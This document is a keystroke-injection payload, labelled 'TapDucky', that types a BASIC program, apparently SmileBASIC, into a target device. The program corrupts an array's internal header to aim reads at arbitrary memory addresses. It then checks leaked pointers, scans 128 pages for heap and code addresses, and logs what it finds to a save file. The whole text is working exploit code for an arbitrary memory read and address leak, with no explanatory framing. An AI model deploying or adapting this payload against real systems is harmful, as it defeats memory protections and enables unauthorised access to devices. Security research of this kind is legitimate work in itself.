REM dprobe_v16 upper arena scan fixed -- compact TapDucky payload
DEFAULTDELAY 40
DELAY 2000
STRINGLN VAR NSR,ZERO$=CHR$(0),I
STRINGLN VAR CAP$
STRINGLN FOR I=1 TO 18:ZERO$=ZERO$+ZERO$:NEXT
STRINGLN NSR=ARRAY$(4)
STRINGLN COPY NSR[0],0,"0000":COPY NSR[1],0,"1111"
STRINGLN COPY NSR[2],0,"2222":COPY NSR[3],0,"3333"
STRINGLN PRINT "DIST PROBE READY",1035
STRINGLN END
STRINGLN COMMON DEF P$(V#)
STRINGLN VAR S$="",J
STRINGLN FOR J=0 TO 3
STRINGLN S$=S$+CHR$(V#-FLOOR(V#/65536)*65536):V#=FLOOR(V#/65536)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF U#(S$)
STRINGLN VAR V#=0,J
STRINGLN IF LEN(S$)<4 THEN RETURN 0
STRINGLN FOR J=3 TO 0 STEP -1:V#=V#*65536+ASC(MID$(S$,J,1)):NEXT
STRINGLN RETURN V#
STRINGLN END
STRINGLN COMMON DEF PTR(V#,A)
STRINGLN RETURN V#>0 && V#<549755813888 && V#==FLOOR(V#/A)*A
STRINGLN END
STRINGLN COMMON DEF HX$(V#)
STRINGLN VAR S$="",J,A
STRINGLN FOR J=0 TO 11
STRINGLN A=V#-FLOOR(V#/16)*16
STRINGLN S$=MID$("0123456789ABCDEF",A,1)+S$
STRINGLN V#=FLOOR(V#/16)
STRINGLN NEXT
STRINGLN RETURN S$
STRINGLN END
STRINGLN COMMON DEF PLOG(S$)
STRINGLN CAP$=CAP$+S$+CHR$(10):PRINT S$:RETURN ""
STRINGLN END
STRINGLN COMMON DEF FLOG(S$)
STRINGLN CAP$=CAP$+S$+CHR$(10):RETURN ""
STRINGLN END
STRINGLN COMMON DEF AIM(A#,N)
STRINGLN COPY NSR[0],16,P$(A#)+P$(N)
STRINGLN RETURN ""
STRINGLN END
STRINGLN COMMON DEF PROBE()
STRINGLN VAR V$,D$,X$,J,V#,L#,N,G,Z,E,K,E0#,E3#,OD$,PG#,S$
STRINGLN X$=PLOG("== S1 ==")
STRINGLN V$=COPY(NSR[0],0,16)
STRINGLN FOR J=0 TO 3
STRINGLN V#=U#(MID$(V$,J*4,4))
STRINGLN X$=PLOG("W"+STR$(J)+" "+HX$(V#)+" "+STR$(PTR(V#,16)))
STRINGLN NEXT
STRINGLN E0#=U#(MID$(V$,0,4)):E3#=U#(MID$(V$,12,4))
STRINGLN X$=PLOG("LEN "+HX$(LEN(NSR[0])))
STRINGLN IF !PTR(E0#,16) || !PTR(E3#,16) THEN X$=PLOG("PTRBAD"):SAVEV "TXT:PROBEOUT",CAP$:RETURN 0
STRINGLN OD$=COPY(NSR[0],16,8)
STRINGLN X$=PLOG("S1 OK")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN X$=PLOG("== S2U ==")
STRINGLN G=0:Z=0:E=0:N=0
STRINGLN FOR K=0 TO 127
STRINGLN PG#=E0#+10240+K*4096
STRINGLN X$=AIM(PG#,2048)
STRINGLN D$=COPY(NSR[1],0,2048)
STRINGLN COPY NSR[0],16,OD$
STRINGLN IF LEN(D$)==2048 THEN
STRINGLN FOR J=0 TO 2040 STEP 4
STRINGLN V#=U#(MID$(D$,J,4))
STRINGLN IF V#>=E0#-8388608 && V#<=E0#-2097152 && G<8 THEN
STRINGLN G=G+1:X$=PLOG("G"+STR$(10240+K*4096+J*2)+" "+HX$(V#))
STRINGLN ELSEIF V#>=4294967296 && V#<281474976710656 && V#==FLOOR(V#/8)*8 && E<8 THEN
STRINGLN IF !(V#>=E0#-268435456 && V#<=E0#+268435456) THEN
STRINGLN E=E+1:X$=PLOG("E"+STR$(10240+K*4096+J*2)+" "+HX$(V#))
STRINGLN ENDIF
STRINGLN ENDIF
STRINGLN IF J MOD 8==0 && Z<4 THEN
STRINGLN L#=U#(MID$(D$,J+4,4))
STRINGLN IF L#==262144 && V#>0 && V#==FLOOR(V#/16)*16 THEN
STRINGLN Z=Z+1:X$=PLOG("Z"+STR$(10240+K*4096+J*2)+" "+HX$(V#))
STRINGLN ENDIF
STRINGLN ENDIF
STRINGLN NEXT
STRINGLN ELSE
STRINGLN N=N+1
STRINGLN IF N<=2 THEN X$=PLOG("EDGE"+STR$(K)+" "+STR$(LEN(D$)))
STRINGLN ENDIF
STRINGLN IF K MOD 8==0 THEN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN NEXT
STRINGLN X$=PLOG("GZ "+STR$(G)+" "+STR$(Z)+" E"+STR$(E)+" EDGES "+STR$(N))
STRINGLN X$=PLOG("DONE")
STRINGLN SAVEV "TXT:PROBEOUT",CAP$
STRINGLN RETURN 1
STRINGLN END
